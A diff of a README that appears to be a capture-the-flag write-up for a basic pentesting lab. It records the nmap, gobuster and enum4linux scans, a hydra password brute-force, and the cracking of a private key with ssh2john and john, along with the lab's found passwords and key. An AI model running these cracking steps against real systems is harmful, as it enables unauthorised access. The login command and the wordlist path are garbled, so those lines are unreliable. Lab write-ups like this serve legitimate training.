@@ -5,13 +5,13 @@ README.MD
 ### NMAP
 
 Command:
-```
+```bash
 nmap -sV -sT -A -oN basicpen_nmap.txt 10.10.179.252
 ```
 
 Ports:
 
-```
+```bash
 22
 80
 139
@@ -39,13 +39,13 @@ smb security mode:
 ### Gobuster
 
 Command:
-```
+```bash
 gobuster -w ../../../tools/lists/directory-list-2.3-medium.txt -u 10.10.179.252 | tee gobuster_report.txt
 ```
 
 Path's found:
 
-```
+```bash
 /Development
 ```
 
@@ -54,12 +54,12 @@ two notes saying J has weak password and SMB setup.
 ### Enum4linux
 
 Command:
-```
+```bash
  enum4linux -a 10.10.179.252 | tee enum4linux_report.txt
 ```
 
 users: 
-```
+```bash
 kay
 jan
 ```
@@ -68,12 +68,12 @@ jan
 
 Command: 
 
-```
+```bash
 hydra -l jan -P /usr/share/wordlist/rockyou.txt
 ```
 
 Password found:
-```
+```bash
 armando
 ```
 
@@ -87,12 +87,12 @@ home dir empty
 readable files:
 
 public key:
-```
+```bash
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCzAsDwjb0ft4IO7Kyux8DWocNiS1aJqpdVEo+gfk8Ng624b9qOQp7LOWDMVIINfCuzkTA3ZugSyo1OehPc0iyD7SfJIMzsETFvlHB3DlLLeNFm11hNeUBCF4Lt6o9uH3lcTuPVyZAvbAt7xD66bKjyEUy3hrpSnruN+M0exdSjaV54PI9TBFkUmmqpXsrWzMj1QaxBxZMq3xaBxTsFvW2nEx0rPOrnltQM4bdAvmvSXtuxLw6e5iCaAy1eoTHw0N6IfeGvwcHXIlCT25gH1gRfS0/NdR9cs78ylxYTLDnNvkxL1J3cVzVHJ/ZfOOWOCK4iJ/K8PIbSnYsBkSnrIlDX27PM7DZCBu+xhIwV5z4hRwwZZG5VcU+nDZZYr4xtpPbQcIQWYjVwr5vF3vehk57ymIWLwNqU/rSnZ0wZH8MURhVFaNOdr/0184Z1dJZ34u3NbIBxEV9XsjAh/L52Dt7DNHWqUJKIL1/NV96LKDqHKCXCRFBOh9BgqJUIAXoDdWLtBunFKu/tgCz0n7SIPSZDxJDhF4StAhFbGCHP9NIMvB890FjJE/vys/PuY3efX1GjTdAijRa019M2f8d0OnJpktNwCIMxEjvKyGQKGPLtTS8o0UAgLfV50Zuhg7H5j6RAJoSgFOtlosnFzwNuxxU05ozHuJ59wsmn5LMK97sbow== I don't have to type a long password anymore!
 ```
 
 private key:
-```
+```bash
 -----BEGIN RSA PRIVATE KEY-----
 Proc-Type: 4,ENCRYPTED
 DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75
@@ -152,15 +152,30 @@ e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
 # John
 
 Command:
-```
+```bash
 python3 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
 ```
 
 Run John
-```
+```bash
 john id_rsa.hash -wordlist=/usr/share/wordlists=rockyou.txt
 ```
 
 output = `beeswax`
 
 ref: https://medium.com/the-padlock/cracking-ssh-private-key-passphrase-459ba17e8d5d
+
+
+### login as kay
+
+```bash
+sudo -i id_rsa kay@10.10.118.99
+pass: beeswax
+```
+
+pass.bak:
+```bash
+heresareallystrongpasswordthatfollowsthepasswordpolicy$$
+```
+
+Finished room.
